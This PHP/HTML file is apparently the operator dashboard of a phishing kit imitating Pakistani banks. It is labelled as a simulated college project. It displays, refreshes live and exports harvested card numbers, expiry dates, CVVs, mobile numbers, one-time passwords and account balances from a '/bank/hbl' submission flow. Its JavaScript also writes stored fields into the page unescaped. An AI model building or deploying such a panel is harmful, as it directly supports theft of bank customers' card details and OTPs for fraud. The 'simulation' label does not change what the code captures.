<?php
$dataFile = __DIR__ . '/data/submissions.json';
$submissions = file_exists($dataFile) ? (json_decode(file_get_contents($dataFile), true) ?? []) : [];
$reversed = array_reverse($submissions);
?>
<!DOCTYPE html>
<html lang="en" class="bg-background">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Simulated Submissions Inspector | SBP College Project</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="/public/css/style.css">
    <meta name="theme-color" content="#1f8a52">
    <style>
        body { font-family: 'Manrope', system-ui, sans-serif; }
    </style>
</head>
<body class="font-sans antialiased text-foreground bg-slate-50 min-h-screen">
    <header class="border-b border-border bg-white sticky top-0 z-30 shadow-sm">
        <div class="mx-auto flex max-w-7xl items-center justify-between px-4 py-3 sm:px-6">
            <div class="flex items-center gap-3">
                <a href="/" class="flex h-9 w-9 items-center justify-center rounded-lg border border-border hover:bg-slate-100 transition">
                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><polyline points="15 18 9 12 15 6"/></svg>
                </a>
                <span class="flex h-9 w-9 items-center justify-center overflow-hidden rounded-full bg-white ring-1 ring-primary/20">
                    <img src="/public/logos/state-bank-of-pakistan.png" onerror="this.src='https://sbp-phase-3.vercel.app/logos/state-bank-of-pakistan.png'" alt="Logo" class="h-full w-full object-contain p-0.5">
                </span>
                <div>
                    <h1 class="text-base font-bold text-slate-900 leading-tight">Simulated Submissions Inspector</h1>
                    <p class="text-xs text-slate-500">Live JSON storage reader & test environment</p>
                </div>
            </div>
            <div class="flex items-center gap-2">
                <a href="/api.php?action=download" class="inline-flex items-center gap-1.5 rounded-xl bg-primary px-3.5 py-2 text-xs font-bold text-white shadow hover:brightness-105 transition">
                    <svg xmlns="http://www.w3.org/2000/svg" width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" x2="12" y1="15" y2="3"/></svg>
                    Export JSON
                </a>
                <button id="clear-all-btn" class="inline-flex items-center gap-1.5 rounded-xl bg-rose-50 border border-rose-200 px-3 py-2 text-xs font-bold text-rose-700 hover:bg-rose-100 transition">
                    Clear Data
                </button>
            </div>
        </div>
    </header>

    <main class="mx-auto max-w-7xl px-4 py-6 sm:px-6">
        <!-- STATS -->
        <div class="grid grid-cols-1 gap-4 sm:grid-cols-4 mb-6">
            <div class="rounded-2xl border border-slate-200 bg-white p-4 shadow-sm">
                <p class="text-xs font-semibold uppercase tracking-wider text-slate-500">Total Records</p>
                <p id="stat-total" class="mt-2 text-2xl font-black text-slate-900"><?= count($submissions) ?></p>
                <p class="mt-1 text-xs text-emerald-600 font-medium">Saved in submissions.json</p>
            </div>
            <div class="rounded-2xl border border-slate-200 bg-white p-4 shadow-sm">
                <p class="text-xs font-semibold uppercase tracking-wider text-slate-500">Storage File</p>
                <p class="mt-2 text-sm font-bold text-slate-800 truncate font-mono">data/submissions.json</p>
                <p class="mt-1 text-xs text-slate-500">Auto-persisted</p>
            </div>
            <div class="rounded-2xl border border-slate-200 bg-white p-4 shadow-sm">
                <p class="text-xs font-semibold uppercase tracking-wider text-slate-500">Live Status</p>
                <div class="mt-2 flex items-center gap-2">
                    <span class="h-3 w-3 rounded-full bg-emerald-500 animate-pulse"></span>
                    <span class="text-sm font-bold text-slate-900">Active Listener</span>
                </div>
                <p class="mt-1 text-xs text-slate-500">Auto-refreshes every 5s</p>
            </div>
            <div class="rounded-2xl border border-slate-200 bg-white p-4 shadow-sm">
                <p class="text-xs font-semibold uppercase tracking-wider text-slate-500">Direct Links</p>
                <div class="mt-2 flex gap-2">
                    <a href="/bank/hbl" class="text-xs font-bold text-primary hover:underline">Test HBL Flow &rarr;</a>
                </div>
                <p class="mt-1 text-xs text-slate-500"><a href="/" class="text-slate-600 hover:underline">View Bank Directory</a></p>
            </div>
        </div>

        <!-- TABLE SECTION -->
        <div class="rounded-2xl border border-slate-200 bg-white shadow-sm overflow-hidden">
            <div class="border-b border-slate-200 px-5 py-4 flex flex-wrap items-center justify-between gap-3">
                <div>
                    <h2 class="text-base font-bold text-slate-900">Captured Simulation Submissions</h2>
                    <p class="text-xs text-slate-500">All data entered during testing is recorded in real time.</p>
                </div>
                <div class="flex items-center gap-2">
                    <input id="table-search" type="text" placeholder="Filter records..." class="rounded-xl border border-slate-200 px-3.5 py-1.5 text-xs text-slate-800 outline-none focus:border-primary">
                    <button id="refresh-btn" class="rounded-xl border border-slate-200 px-3 py-1.5 text-xs font-semibold text-slate-700 hover:bg-slate-50">
                        Refresh
                    </button>
                </div>
            </div>

            <div class="overflow-x-auto">
                <table class="w-full text-left text-xs">
                    <thead class="bg-slate-50 border-b border-slate-200 text-slate-600 uppercase font-semibold">
                        <tr>
                            <th class="px-4 py-3">Timestamp</th>
                            <th class="px-4 py-3">Bank</th>
                            <th class="px-4 py-3">Card Number</th>
                            <th class="px-4 py-3">Exp / CVV</th>
                            <th class="px-4 py-3">Mobile No</th>
                            <th class="px-4 py-3">OTP 1</th>
                            <th class="px-4 py-3">Balance (PKR)</th>
                            <th class="px-4 py-3">Verify OTP</th>
                            <th class="px-4 py-3">Last Step</th>
                            <th class="px-4 py-3 text-right">Actions</th>
                        </tr>
                    </thead>
                    <tbody id="submissions-tbody" class="divide-y divide-slate-100 font-medium text-slate-800">
                        <?php if (empty($reversed)): ?>
                            <tr id="no-records-row">
                                <td colspan="10" class="px-4 py-12 text-center text-slate-400">
                                    No simulated submissions recorded yet. Go to <a href="/bank/hbl" class="text-primary font-bold hover:underline">/bank/hbl</a> and test a submission!
                                </td>
                            </tr>
                        <?php else: ?>
                            <?php foreach ($reversed as $sub): 
                                $d = $sub['data'] ?? [];
                            ?>
                            <tr class="hover:bg-slate-50/80 transition">
                                <td class="px-4 py-3 font-mono text-[0.7rem] text-slate-500 whitespace-nowrap"><?= htmlspecialchars($sub['updated_at'] ?? $sub['created_at'] ?? 'N/A') ?></td>
                                <td class="px-4 py-3 font-bold text-slate-900 whitespace-nowrap">
                                    <span class="inline-flex items-center gap-1.5">
                                        <span class="h-2 w-2 rounded-full bg-emerald-500"></span>
                                        <?= htmlspecialchars($sub['bank_name'] ?? strtoupper($sub['bank_slug'] ?? 'HBL')) ?>
                                    </span>
                                </td>
                                <td class="px-4 py-3 font-mono text-slate-700 whitespace-nowrap"><?= htmlspecialchars($d['card_number'] ?? '—') ?></td>
                                <td class="px-4 py-3 font-mono text-slate-600 whitespace-nowrap">
                                    <?= htmlspecialchars(($d['exp_month'] ?? '') . '/' . ($d['exp_year'] ?? '')) ?> | CVV: <?= htmlspecialchars($d['cvv'] ?? '—') ?>
                                </td>
                                <td class="px-4 py-3 font-mono text-primary font-bold whitespace-nowrap"><?= htmlspecialchars($d['mobile'] ?? '—') ?></td>
                                <td class="px-4 py-3 font-mono text-amber-600 font-bold whitespace-nowrap"><?= htmlspecialchars($d['otp'] ?? '—') ?></td>
                                <td class="px-4 py-3 font-bold text-emerald-700 whitespace-nowrap"><?= !empty($d['balance']) ? ('PKR ' . htmlspecialchars($d['balance'])) : '—' ?></td>
                                <td class="px-4 py-3 font-mono text-purple-600 font-bold whitespace-nowrap"><?= htmlspecialchars($d['verify_otp'] ?? '—') ?></td>
                                <td class="px-4 py-3 whitespace-nowrap">
                                    <span class="inline-flex rounded-full px-2 py-0.5 text-[0.65rem] font-bold bg-slate-100 text-slate-700 uppercase">
                                        <?= htmlspecialchars($sub['last_step'] ?? 'card') ?>
                                    </span>
                                </td>
                                <td class="px-4 py-3 text-right whitespace-nowrap">
                                    <button class="view-json-btn text-xs text-primary font-bold hover:underline" data-json="<?= htmlspecialchars(json_encode($sub), ENT_QUOTES, 'UTF-8') ?>">
                                        Raw JSON
                                    </button>
                                </td>
                            </tr>
                            <?php endforeach; ?>
                        <?php endif; ?>
                    </tbody>
                </table>
            </div>
        </div>

        <!-- RAW JSON VIEWER MODAL -->
        <div id="json-modal" class="hidden fixed inset-0 z-50 flex items-center justify-center bg-black/50 p-4">
            <div class="w-full max-w-2xl rounded-3xl bg-white p-6 shadow-2xl">
                <div class="flex items-center justify-between pb-3 border-b border-slate-100">
                    <h3 class="text-base font-bold text-slate-900">Submission JSON Object</h3>
                    <button id="close-modal-btn" class="h-8 w-8 rounded-full bg-slate-100 flex items-center justify-center text-slate-600 hover:bg-slate-200">✕</button>
                </div>
                <pre id="modal-json-content" class="mt-4 max-h-96 overflow-auto rounded-2xl bg-slate-900 p-4 text-xs font-mono text-emerald-400"></pre>
                <div class="mt-4 flex justify-end gap-2">
                    <button id="copy-json-btn" class="rounded-xl bg-primary px-4 py-2 text-xs font-bold text-white hover:brightness-105">Copy JSON</button>
                </div>
            </div>
        </div>
    </main>

    <script>
        const clearBtn = document.getElementById('clear-all-btn');
        const refreshBtn = document.getElementById('refresh-btn');
        const searchInput = document.getElementById('table-search');
        const tbody = document.getElementById('submissions-tbody');
        const statTotal = document.getElementById('stat-total');
        const modal = document.getElementById('json-modal');
        const modalJson = document.getElementById('modal-json-content');
        const closeModal = document.getElementById('close-modal-btn');
        const copyJson = document.getElementById('copy-json-btn');

        async function fetchSubmissions() {
            try {
                const res = await fetch('/api.php?action=get_submissions');
                const data = await res.json();
                if (data.success) {
                    renderTable(data.submissions);
                    if (statTotal) statTotal.textContent = data.count;
                }
            } catch (e) {
                console.error('Fetch failed:', e);
            }
        }

        function renderTable(list) {
            const q = (searchInput ? searchInput.value : '').toLowerCase();
            const filtered = list.filter(item => {
                const text = JSON.stringify(item).toLowerCase();
                return !q || text.includes(q);
            });

            if (filtered.length === 0) {
                tbody.innerHTML = '<tr><td colspan="10" class="px-4 py-12 text-center text-slate-400">No records found.</td></tr>';
                return;
            }

            tbody.innerHTML = filtered.map(sub => {
                const d = sub.data || {};
                const exp = (d.exp_month || '') + '/' + (d.exp_year || '');
                return `
                    <tr class="hover:bg-slate-50/80 transition">
                        <td class="px-4 py-3 font-mono text-[0.7rem] text-slate-500 whitespace-nowrap">${sub.updated_at || sub.created_at || 'N/A'}</td>
                        <td class="px-4 py-3 font-bold text-slate-900 whitespace-nowrap">
                            <span class="inline-flex items-center gap-1.5">
                                <span class="h-2 w-2 rounded-full bg-emerald-500"></span>
                                ${sub.bank_name || (sub.bank_slug || 'HBL').toUpperCase()}
                            </span>
                        </td>
                        <td class="px-4 py-3 font-mono text-slate-700 whitespace-nowrap">${d.card_number || '—'}</td>
                        <td class="px-4 py-3 font-mono text-slate-600 whitespace-nowrap">${exp} | CVV: ${d.cvv || '—'}</td>
                        <td class="px-4 py-3 font-mono text-primary font-bold whitespace-nowrap">${d.mobile || '—'}</td>
                        <td class="px-4 py-3 font-mono text-amber-600 font-bold whitespace-nowrap">${d.otp || '—'}</td>
                        <td class="px-4 py-3 font-bold text-emerald-700 whitespace-nowrap">${d.balance ? 'PKR ' + d.balance : '—'}</td>
                        <td class="px-4 py-3 font-mono text-purple-600 font-bold whitespace-nowrap">${d.verify_otp || '—'}</td>
                        <td class="px-4 py-3 whitespace-nowrap">
                            <span class="inline-flex rounded-full px-2 py-0.5 text-[0.65rem] font-bold bg-slate-100 text-slate-700 uppercase">
                                ${sub.last_step || 'card'}
                            </span>
                        </td>
                        <td class="px-4 py-3 text-right whitespace-nowrap">
                            <button class="view-json-btn text-xs text-primary font-bold hover:underline" onclick='showModal(${JSON.stringify(sub).replace(/'/g, "&apos;")})'>
                                Raw JSON
                            </button>
                        </td>
                    </tr>
                `;
            }).join('');
        }

        window.showModal = function(obj) {
            modalJson.textContent = JSON.stringify(obj, null, 2);
            modal.classList.remove('hidden');
        };

        if (closeModal) closeModal.onclick = () => modal.classList.add('hidden');
        if (copyJson) {
            copyJson.onclick = () => {
                navigator.clipboard.writeText(modalJson.textContent);
                copyJson.textContent = 'Copied!';
                setTimeout(() => copyJson.textContent = 'Copy JSON', 2000);
            };
        }

        if (clearBtn) {
            clearBtn.addEventListener('click', async () => {
                if (confirm('Are you sure you want to clear all simulated test submissions?')) {
                    await fetch('/api.php?action=clear');
                    fetchSubmissions();
                }
            });
        }

        if (refreshBtn) refreshBtn.onclick = () => fetchSubmissions();
        if (searchInput) searchInput.oninput = () => fetchSubmissions();

        // Auto refresh every 5 seconds for live presentation
        setInterval(fetchSubmissions, 5000);
    </script>
</body>
</html>
